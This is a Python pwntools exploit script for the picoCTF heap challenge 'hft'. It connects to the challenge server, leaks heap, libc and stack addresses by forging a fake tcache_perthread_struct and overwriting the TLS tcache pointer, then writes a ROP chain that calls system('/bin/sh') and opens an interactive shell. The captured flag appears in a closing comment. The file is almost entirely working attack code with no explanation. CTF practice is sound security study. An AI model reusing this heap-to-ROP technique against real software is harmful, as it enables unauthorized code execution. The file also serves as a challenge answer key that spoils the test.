from pwn import *

exe = ELF("./hft_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
context.binary = exe

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

def malloc(size, msg):
    p_sa(b"PKT_RES]\n", p64(size))
    p.recvrepeat(0.1)
    if(msg != b""):
        p_sl(p64(1) + msg)
    else:
        p_sl(p64(1)[:7:])

'''
fread in main
'''

script = '''
brva 0x12B2
'''

p = remote("tethys.picoctf.net", 56833)
#p = process("./hft_patched")

# free top chunk
malloc(0x18, b"0" * 8 + p64(0x1000 - 0x2b0 + 1))
malloc(0x1000, b"")

# last remainder -> leak heap
malloc(0x18, b"")
p_recvut(b"[m:[")
heap_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x2b0
print(hex(heap_base))

# set up fake tcache per thread
## [0x20 tcache]: (chunk have libc address value)
## [0x30 tcache]: fake tcache per thread
fake_tcache = p16(0x30) * 64 + p64(heap_base + 0x560) + p64(heap_base + 0x2e0) * 10
malloc(0x280, fake_tcache)

# overwrite tcache per thread in TLS (point to our fake tcache per thread)
## pwndbg> x/20gx &tcache
malloc(0x22000, b"2" * (0x236f8 - 0x20) + p64(heap_base + 0x2f0))

# leak libc
malloc(0x18, b"")
p_recvut(b"[m:[")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x21a270
print(hex(libc_base))

# set up fake tcache per thread
## [0x20 tcache]: [__environ - 0x10]
## [0x30 tcache]: fake tcache per thread
__environ = libc_base + libc.symbols['__environ']
fake_tcache = p16(0x30) * 64 + p64(__environ - 0x10) + p64(heap_base + 0x2e0) * 10
malloc(0x28, fake_tcache)

# leak stack
malloc(0x18, b"")
p_recvut(b"[m:[")
rsp = u64(p.recv(6).ljust(8, b"\x00")) - 0x148
print(hex(rsp))

#debug()

# set up fake tcache per thread
## [0x20 tcache]: [rsp - 0x30]
## [0x30 tcache]: fake tcache per thread
fake_tcache = p16(0x30) * 64 + p64(rsp - 0x30) + p64(heap_base + 0x2e0) * 10
malloc(0x28, fake_tcache)

# ROP (overwrite saved rip of gets)
pop_rdi = libc_base + 0x000000000002a3e5
ret = pop_rdi + 1
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
rop_chain = p64(ret) * 3 + p64(pop_rdi)
rop_chain += p64(binsh) + p64(ret)
rop_chain += p64(system)
malloc(0x18, rop_chain)

p.interactive()
#picoCTF{mm4p_mm4573r_ff5688b1}